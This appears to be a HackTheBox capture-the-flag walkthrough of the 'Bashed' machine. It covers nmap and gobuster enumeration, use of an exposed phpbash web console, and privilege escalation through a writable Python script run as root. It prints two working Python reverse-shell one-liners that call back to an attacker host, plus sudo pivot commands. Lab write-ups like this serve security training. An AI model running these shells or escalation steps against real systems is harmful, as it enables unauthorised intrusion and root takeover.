# Bashed Walkthrough

![Bashed](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Bashed/bashed.png)

## Let's first fast scan out machine 

```
sudo nmap -F -sV 10.10.10.68
```

### Result

```
PORT   STATE SERVICE VERSION 
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

## Fast scan gives one port (80) as open let's also do a berifly scan

```
sudo nmap -A -O -v --script vuln 10.10.10.68
```

### Result

```
PORT   STATE SERVICE VERSION 
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu)) 
| http-slowloris-check:  
|   VULNERABLE: 
|   Slowloris DOS attack 
|     State: LIKELY VULNERABLE 
|     IDs:  CVE:CVE-2007-6750 
|       Slowloris tries to keep many connections to the target web server open and hold 
|       them open as long as possible.  It accomplishes this by opening connections to 
|       the target web server and sending a partial request. By doing so, it starves 
|       the http server's resources causing Denial Of Service. 
|        
|     Disclosure date: 2009-09-17 
|     References: 
|       http://ha.ckers.org/slowloris/ 
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
| http-sql-injection:  
|   Possible sqli for queries: 
|     http://10.10.10.68:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider 
|     http://10.10.10.68:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider 
|     http://10.10.10.68:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider 
|_    http://10.10.10.68:80/js/?C=N%3BO%3DD%27%20OR%20sqlspider 
| http-enum:  
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)' 
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)' 
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)' 
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)' 
|   /php/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)' 
|_  /uploads/: Potentially interesting folder 
| vulners:  
|   cpe:/a:apache:http_server:2.4.18:  
|       E899CC4B-A3FD-5288-BB62-A4201F93FDCC    10.0    https://vulners.com/githubexploit/E899CC4B-A3FD-5288-BB62-A4201F93FDCC
*EXPLOIT* 
|       5DE1B404-0368-5986-856A-306EA0FE0C09    10.0    https://vulners.com/githubexploit/5DE1B404-0368-5986-856A-306EA0FE0C09
*EXPLOIT* 
|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943 
|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720 
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790 
|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275 
|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691 
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679 
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668 
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169 
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/ 7.2     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/
*EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/      7.2     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2019-0211/     *EXPLOIT* 
|       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2     https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4
259C41D8BDA0AB  *EXPLOIT* 
|       EDB-ID:46676    7.2     https://vulners.com/exploitdb/EDB-ID:46676      *EXPLOIT* 
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211 
|       1337DAY-ID-32502        7.2     https://vulners.com/zdt/1337DAY-ID-32502        *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/    *
EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/ *EXPLO
IT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/     6.8     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2017-15715/    *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP1-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP1-CVE-2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/FREEBSD-CVE-2017-15715/     6.8     https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/   *
EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/    *
EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/ 6.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/
*EXPLOIT* 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8
*EXPLOIT* 
|       CVE-2022-22721  6.8     https://vulners.com/cve/CVE-2022-22721 
|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438 
|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452 
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312 
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715 
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332
*EXPLOIT* 
|       CVE-2021-44224  6.4     https://vulners.com/cve/CVE-2021-44224 
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082 
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/ 6.0     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/
*EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/      6.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2019-0217/     *EXPLOIT* 
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217 
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927 
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098 
|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT* 
|       CVE-2016-5387   5.1     https://vulners.com/cve/CVE-2016-5387 
|       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1333/       5.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1303/       5.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/    *
EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/       5.0     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2020-1934/      *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2017-15710/     *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/     5.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2017-15710/    *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/      5.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2016-8743/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2017-15710/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2017-15710/     *EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/        5.0     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-20
17-15710/       *EXPLOIT* 
|       MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED  5.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APAC
HE_OPTIONSBLEED *EXPLOIT* 
|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0
405CB0AA9C075D  *EXPLOIT* 
|       EXPLOITPACK:2666FB0676B4B582D689921651A30355    5.0     https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D6
89921651A30355  *EXPLOIT* 
|       EDB-ID:42745    5.0     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT* 
|       EDB-ID:40909    5.0     https://vulners.com/exploitdb/EDB-ID:40909      *EXPLOIT* 
|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719 
|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798 
|       CVE-2021-33193  5.0     https://vulners.com/cve/CVE-2021-33193 
|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690 
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934 
|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567 
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220 
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196 
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199 
|       CVE-2018-17189  5.0     https://vulners.com/cve/CVE-2018-17189 
|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333 
|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303 
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798 
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710 
|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743 
|       CVE-2016-8740   5.0     https://vulners.com/cve/CVE-2016-8740 
|       CVE-2016-4979   5.0     https://vulners.com/cve/CVE-2016-4979 
|       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/       4.9     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2019-0197/      *EXPLOIT* 
|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197 
|       MSF:ILITIES/UBUNTU-CVE-2018-1302/       4.3     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1301/       4.3     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/     *
EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/       4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2016-4975/      *EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2019-10092/      4.3     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/    *
EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/        4.3     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-20
20-11985/       *EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/        4.3     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-20
19-10092/       *EXPLOIT* 
|       CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985 
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092 
|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302 
|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301 
|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763 
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975 
|       CVE-2016-1546   4.3     https://vulners.com/cve/CVE-2016-1546 
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D
*EXPLOIT* 
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1283/       3.5     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/     *
EXPLOIT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/ 3.5     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/
*EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/       3.5     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2018-1283/      *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/      3.5     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2018-1283/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/       3.5     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2018-1283/      *EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/ 3.5     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/
*EXPLOIT* 
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283 
|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612 
|_      PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT* 
|_http-server-header: Apache/2.4.18 (Ubuntu) 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
| http-internal-ip-disclosure:  
|_  Internal IP Leaked: 127.0.1.1 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 
Aggressive OS guesses: Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 4.8 (95%), Linux 4.9 (95%), Linux 3.16 (95%), Linux 3.12
 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 4.4 (95%) 
No exact OS matches for host (test conditions non-ideal). 
Uptime guess: 0.007 days (since Sun Apr  3 08:59:59 2022) 
Network Distance: 2 hops 
TCP Sequence Prediction: Difficulty=264 (Good luck!) 
IP ID Sequence Generation: All zeros 
 
TRACEROUTE (using port 443/tcp) 
HOP RTT       ADDRESS 
1   283.31 ms 10.10.14.1 
2   282.05 ms 10.10.10.68
```

## After completing nmap scan we find only one port as open ie, 80(http) And also few directories in nmap scan . Let's acess http port and start enumerating further.

## Let's scan webserver with gobuster 

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.68/ --no-error
``` 

### Result

```
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/] 
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/] 
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]     
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]     
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]     
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]      
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]
```

## Here we got few directories in /dev directory we got two files 

![files](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Bashed/files.png)

## here we click on second file and got a web based phpbash konsole. 

![konsole](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Bashed/webkonsole.png)

## let's first take a shell from our terminal using python reverse shell 

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Start a netcat listner and you got shell on terminal.

![shell](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Bashed/shell.png)

## In home directory we got arrexel folder and in this folder we got our first user.txt flag.

## Now we know we are www-data let's try to run 

```
sudo -l
```

### Result

```
Matching Defaults entries for www-data on bashed: 
    env_reset, mail_badpass, 
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
 
User www-data may run the following commands on bashed: 
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

## to understand which command we can run as local host. Let's change to scriptmanager to check if this user has access to a folder that www-data could not access. But first I spawn a proper shell with the command .

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## we got tty bash shell and we know we can acess scriptmanager without any password using below command

```
sudo -u scriptmanager /bin/bash
```

## Here we got scriptmanager user access in scriptmanager root directory we got a scripts directory in which we got two files name test.txt and test.py

![scripts](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Bashed/scripts.png)

## here we know test.txt file has root access and test.py has scriptmanager access. Let's find a python exploit for priv esc . While seaching we got a website name https://johnjhacking.com/blog/linux-privilege-escalation-quick-and-dirty/ . Here we got a Premissive Root Script let's use this one for priv esc.

```
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Your IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> root.py
```

## Then start a netcat listner then after few time you got shell as Root.

![root](https://c.tenor.com/BnEKiDKJisEAAAAC/claire-dancing.gif)
